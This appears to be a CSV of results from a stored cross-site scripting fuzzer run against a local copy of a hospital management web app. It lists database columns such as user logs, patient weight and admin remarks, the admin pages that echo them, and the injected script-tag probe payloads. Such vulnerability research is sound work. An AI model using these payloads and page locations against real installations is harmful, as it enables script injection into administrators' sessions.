web app,DB source,reflection sink,id,payload,description
hospital,doctorslog.logout,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",902056,"""'><script>xss(902056)</script>","
            hms.doctorslog.logout[1][5]
            original row: [21, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '06-11-2022 05:35:18 PM', 1]
            fuzzed row: [21, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '""\'><script>xss(902056)</script>', 1]
            change: '06-11-2022 05:35:18 PM' => '""'><script>xss(902056)</script>'
            
fuzzed after scan 28 / 41
found as XSS in scan 29 / 41"
hospital,doctorslog.username,"http://localhost/hospital/hms/admin/doctor-logs.php
http://localhost/hospital/hms/admin/doctor-logs.php#",902121,"""'><script>xss(902121)</script>","
            hms.doctorslog.username[1][2]
            original row: [21, 2, 'charudua12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '06-11-2022 05:35:18 PM', 1]
            fuzzed row: [21, 2, '""\'><script>xss(902121)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 11, 59, 40), '06-11-2022 05:35:18 PM', 1]
            change: 'charudua12@test.com' => '""'><script>xss(902121)</script>'
            
fuzzed after scan 27 / 41
found as XSS in scan 28 / 41"
hospital,users.gender,"http://localhost/hospital/hms/admin/manage-users.php
http://localhost/hospital/hms/admin/manage-users.php#",902308,"""'><script>xss(902308)</script>","
            hms.users.gender[0][4]
            original row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', 'male', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            fuzzed row: [1, 'John Doe', 'A 123 ABC Apartment GZB 201017', 'Ghaziabad', '""\'><script>xss(902308)</script>', 'johndoe12@test.com', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 6, 12, 13, 56), None]
            change: 'male' => '""'><script>xss(902308)</script>'
            
fuzzed after scan 24 / 41
found as XSS in scan 25 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",902804,"""'><script>xss(902804)</script>","
            hms.userlog.username[5][2]
            original row: [6, 1, 'johndoe12@test.com', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 39, 7), None, 1]
            fuzzed row: [6, 1, '""\'><script>xss(902804)</script>', bytearray(b'192.168.144.1\x00\x00\x00'), datetime.datetime(2023, 3, 6, 7, 39, 7), None, 1]
            change: 'johndoe12@test.com' => '""'><script>xss(902804)</script>'
            
fuzzed after scan 19 / 41
found as XSS in scan 20 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",904096,"""'><script>xss(904096)</script>","
            hms.userlog.logout[0][5]
            original row: [1, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), None, 1]
            fuzzed row: [1, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), '""\'><script>xss(904096)</script>', 1]
            change: 'None' => '""'><script>xss(904096)</script>'
            
fuzzed after scan 20 / 41
found as XSS in scan 21 / 41"
hospital,userlog.logout,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",910361,"""'><script>xss(910361)</script>","
            hms.userlog.logout[3][5]
            original row: [4, 2, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '06-11-2022 06:50:46 PM', 1]
            fuzzed row: [4, 2, 'amitk@gmail.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 13, 15, 58), '""\'><script>xss(910361)</script>', 1]
            change: '06-11-2022 06:50:46 PM' => '""'><script>xss(910361)</script>'
            
fuzzed after scan 20 / 41
found as XSS in scan 21 / 41"
hospital,tblmedicalhistory.Weight,http://localhost/hospital/hms/admin/view-patient.php?viewid=1,911999,"""'><script>xss(911999)</script>","
            hms.tblmedicalhistory.Weight[0][4]
            original row: [1, 1, '80/120', '120', '85', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            fuzzed row: [1, 1, '80/120', '120', '""\'><script>xss(911999)</script>', '98', 'Test', datetime.datetime(2022, 11, 6, 13, 19, 41)]
            change: '85' => '""'><script>xss(911999)</script>'
            
fuzzed after scan 39 / 41
found as XSS in scan 40 / 41"
hospital,tblcontactus.AdminRemark,http://localhost/hospital/hms/admin/query-details.php?id=1,912250,"""'><script>xss(912250)</script>","
            hms.tblcontactus.AdminRemark[0][6]
            original row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), None, None, None]
            fuzzed row: [1, 'Anuj kumar', 'anujk30@test.com', 1425362514, 'This is for testing purposes.   This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.This is for testing purposes.', datetime.datetime(2022, 10, 30, 16, 52, 3), '""\'><script>xss(912250)</script>', None, None]
            change: 'None' => '""'><script>xss(912250)</script>'
            
fuzzed after scan 13 / 41
found as XSS in scan 14 / 41"
hospital,userlog.username,"http://localhost/hospital/hms/admin/user-logs.php
http://localhost/hospital/hms/admin/user-logs.php#",917720,"""'><script>xss(917720)</script>","
            hms.userlog.username[0][2]
            original row: [1, 1, 'johndoe12@test.com', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), None, 1]
            fuzzed row: [1, 1, '""\'><script>xss(917720)</script>', bytearray(b'::1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'), datetime.datetime(2022, 11, 6, 12, 14, 11), None, 1]
            change: 'johndoe12@test.com' => '""'><script>xss(917720)</script>'
            
fuzzed after scan 19 / 41
found as XSS in scan 20 / 41"
hospital,doctorspecilization.specilization,"http://localhost/hospital/hms/admin/doctor-specilization.php
http://localhost/hospital/hms/admin/doctor-specilization.php#
http://localhost/hospital/hms/admin/edit-doctor-specialization.php?id=6",917869,"""'><script>xss(917869)</script>","
            hms.doctorspecilization.specilization[5][1]
            original row: [6, 'Radiology', datetime.datetime(2022, 10, 30, 18, 10, 46), None]
            fuzzed row: [6, '""\'><script>xss(917869)</script>', datetime.datetime(2022, 10, 30, 18, 10, 46), None]
            change: 'Radiology' => '""'><script>xss(917869)</script>'
            
fuzzed after scan 9 / 41
found as XSS in scan 10 / 41"
